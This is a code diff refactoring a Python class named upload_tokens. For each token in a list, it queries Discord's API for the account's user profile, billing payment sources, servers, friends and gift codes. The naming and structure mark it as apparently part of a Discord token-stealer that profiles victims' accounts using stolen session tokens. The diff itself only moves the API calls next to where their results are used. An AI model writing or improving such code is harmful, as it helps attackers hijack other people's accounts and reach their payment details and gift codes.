@@ -216,17 +216,7 @@ class upload_tokens:
             return
 
         for token in self.tokens:
-            userx = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).text
-            billingx = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).text
-            guildsx = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token}).text
-            friendsx = requests.get('https://discord.com/api/v8/users/@me/relationships', headers={'Authorization': token}).text
-            gift_codesx = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token}).text
-            
-            user = json.loads(userx)
-            billing = json.loads(billingx)
-            guilds = json.loads(guildsx)
-            friends = json.loads(friendsx)
-            gift_codes = json.loads(gift_codesx)
+            user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
 
             username = user['username'] + '#' + user['discriminator']
             user_id = user['id']
@@ -247,7 +237,8 @@ class upload_tokens:
             else:
                 nitro = 'None'
 
-
+            billing = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()
+                
             if billing:
                 payment_methods = []
 
@@ -257,6 +248,8 @@ class upload_tokens:
             else:
                 payment_methods = None
 
+            guilds = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token}).json()
+                
             if guilds:
                 hq_guilds = []
                 for guild in guilds:
@@ -286,6 +279,8 @@ class upload_tokens:
             else:
                 hq_guilds = None
 
+            friends = requests.get('https://discord.com/api/v8/users/@me/relationships', headers={'Authorization': token}).json()
+            
             if friends:
                 hq_friends = []
                 for friend in friends:
@@ -313,6 +308,8 @@ class upload_tokens:
 
             else:
                 hq_friends = None
+            
+            gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token}).json()
             
             if gift_codes:
                 codes = []
